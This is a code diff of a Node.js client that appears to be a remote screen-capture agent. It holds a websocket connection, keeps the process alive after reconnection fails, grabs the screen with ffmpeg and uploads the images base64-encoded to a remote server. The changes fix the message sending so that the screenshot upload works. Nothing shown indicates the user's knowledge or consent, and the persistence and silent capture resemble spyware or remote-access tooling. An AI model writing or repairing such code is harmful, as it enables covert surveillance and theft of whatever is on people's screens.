@@ -32,6 +32,7 @@ function initConnection() {
 
         console.log(`Connected with ID: ${myId}`);
 
+        // Send info as a STRINGIFIED JSON object
         ws.send(JSON.stringify({
             type: 'info',
             id: myId,
@@ -76,7 +77,6 @@ function reconnect() {
         setTimeout(initConnection, delay);
     } else {
         console.log("Max reconnection attempts reached.");
-        // Keep the process alive anyway
         keepAlive();
     }
 }
@@ -110,12 +110,22 @@ function captureScreen() {
              exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
                  if (!err2 && fs.existsSync(imgPath)) {
                      const img = fs.readFileSync(imgPath);
-                     ws.send({ type: 'screen_data', id: myId, data: img.toString('base64') });
+                     // FIX: Stringify the object before sending
+                     ws.send(JSON.stringify({ 
+                         type: 'screen_data', 
+                         id: myId, 
+                         data: img.toString('base64') 
+                     }));
                  }
              });
         } else if (!err && fs.existsSync(imgPath)) {
             const img = fs.readFileSync(imgPath);
-            ws.send({ type: 'screen_data', id: myId, data: img.toString('base64') });
+            // FIX: Stringify the object before sending
+            ws.send(JSON.stringify({ 
+                type: 'screen_data', 
+                id: myId, 
+                data: img.toString('base64') 
+            }));
         }
     });
 }
